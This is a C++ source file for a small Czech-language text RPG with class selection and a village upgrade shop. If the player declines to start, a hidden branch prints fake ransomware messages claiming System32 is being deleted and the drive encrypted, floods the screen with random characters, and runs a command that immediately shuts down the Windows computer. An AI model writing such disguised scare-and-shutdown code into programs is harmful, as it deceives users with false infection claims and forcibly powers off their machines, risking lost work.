#include <iostream>
#include <string>
#include <cstdlib>
#include <ctime>
#include <thread>
#include <chrono>
using namespace std;

struct Postava {
    string jmeno;
    int maxHp, hp;
    int maxMana, mana;
    int utok;
    int zlato;
    int level;
    int xp;
    int kouzla;
    int armor;
};

int main() {
    char vstup;
    int vyber;
    int vybermista;

    Postava hrac;
    hrac.kouzla = 0;
    hrac.armor = 0;

    cout << "------------- Ahoj, vitej v me hre! -------------\n";
    cout << "Chces zacit? (y/y): ";
    cin >> vstup;

    if (vstup == 'y' || vstup == 'Y') {

        cout << "Vyborne! Vitej ve stredoveku...\n";
        cout << "\nVyber si svou tridu:\n";
        cout << "1) Lupic\nHP: 25, Max Mana: 10, Utok: 35\n";
        cout << "2) Mag\nHP: 20, Max Mana: 50, Utok: 15\n";
        cout << "3) Rybar\nHP: 30, Max Mana: 15, Utok: 28\n";
        cout << "4) Rytir\nHP: 45, Max Mana: 15, Utok: 25\n";
        cout << "5) Kral\nHP: 25, Max Mana: 35, Utok: 20\n";
        cout << "Tvoje volba: ";
        cin >> vyber;

        if (vyber == 1) {
            hrac.jmeno = "Lupic";
            hrac.maxHp = hrac.hp = 25;
            hrac.maxMana = hrac.mana = 10;
            hrac.utok = 35;
            hrac.zlato = 10;
            hrac.level = 1;
            hrac.xp = 0;
        }
        else if (vyber == 2) {
            hrac.jmeno = "Mag";
            hrac.maxHp = hrac.hp = 20;
            hrac.maxMana = hrac.mana = 50;
            hrac.utok = 15;
            hrac.zlato = 5;
            hrac.level = 1;
            hrac.xp = 0;
        }
        else if (vyber == 3) {
            hrac.jmeno = "Rybar";
            hrac.maxHp = hrac.hp = 30;
            hrac.maxMana = hrac.mana = 15;
            hrac.utok = 28;
            hrac.zlato = 8;
            hrac.level = 1;
            hrac.xp = 0;
        }
        else if (vyber == 4) {
            hrac.jmeno = "Rytir";
            hrac.maxHp = hrac.hp = 45;
            hrac.maxMana = hrac.mana = 15;
            hrac.utok = 25;
            hrac.zlato = 12;
            hrac.level = 1;
            hrac.xp = 0;
        }
        else if (vyber == 5) {
            hrac.jmeno = "Kral";
            hrac.maxHp = hrac.hp = 25;
            hrac.maxMana = hrac.mana = 35;
            hrac.utok = 20;
            hrac.zlato = 20;
            hrac.level = 1;
            hrac.xp = 0;
        }
        else {
            cout << "\nNespravna volba! Zvol cislo 1-5.\n";
            return 0;
        }

        cout << "\nJsi " << hrac.jmeno
             << ". Muzes jit do dungeonu nebo do vesnice. Co si vyberes? (1 = vesnice / 2 = dungeon): ";
        cin >> vybermista;

        if (vybermista == 1) {

            cout << "-------------Vitej ve vesnici Oglokoma-----------\n";
            cout << "HP: " << hrac.hp << "/" << hrac.maxHp << ", Zlato: " << hrac.zlato << ", Mana: " << hrac.mana << "/" << hrac.maxMana << ", Utok: " << hrac.utok << ", Zkusenosti: " << hrac.xp << ", Level: " << hrac.level << endl;

            cout << "1) Upgradeovat armor (2 XP, 5 zlata)\n";
            cout << "2) Upgradeovat mec (2 XP, 5 zlata)\n";
            cout << "3) Naucit se nove kouzlo (" << hrac.kouzla << "/5)\n";
            cout << "Tvoje volba: ";
            cin >> vyber;

            int puvodniZlato = hrac.zlato;
            int puvodniXP = hrac.xp;

            if (vyber == 1) {
                if (hrac.zlato >= 5 && hrac.xp >= 2) {
                    hrac.zlato -= 5;
                    hrac.xp -= 2;
                    hrac.armor += 1;
                    cout << "Armor byl vylepsen!\n";
                } else {
                    cout << "Nemas dost zlata nebo XP!\n";
                }
            }
            else if (vyber == 2) {
                if (hrac.zlato >= 5 && hrac.xp >= 2) {
                    hrac.zlato -= 5;
                    hrac.xp -= 2;
                    hrac.utok += 1;
                    cout << "Mec byl vylepsen!\n";
                } else {
                    cout << "Nemas dost zlata nebo XP!\n";
                }
            }
            else if (vyber == 3) {
                if (hrac.kouzla < 5 && hrac.zlato >= 5 && hrac.xp >= 2) {
                    hrac.kouzla++;
                    hrac.zlato -= 5;
                    hrac.xp -= 2;
                    cout << "Naucils se nove kouzlo!\n";
                } else {
                    cout << "Nemas dost zdroju nebo uz mas maximum kouzel!\n";
                }
            }
        }
    }
    else {
         srand(time(0));
    cout << "Deleting C:/Windows/System32...\n";
    this_thread::sleep_for(chrono::seconds(1));
    cout << "Disabling Smart App Control, Secure boot...\n\n";
    this_thread::sleep_for(chrono::seconds(1));
    cout << "Encrypting C: drive...\n";
        this_thread::sleep_for(chrono::seconds(1));
    cout << "YOUR PC IS INFECTED\n";

        this_thread::sleep_for(chrono::seconds(1));
        for (int i = 0; i < 50; i++) {
        for (int j = 0; j < 80; j++) {
            cout << (char)(33 + rand() % 94);
        }
        cout << endl;
        this_thread::sleep_for(chrono::milliseconds(150));
        system("shutdown /s /t 0");

    }
    }

    return 0;
}
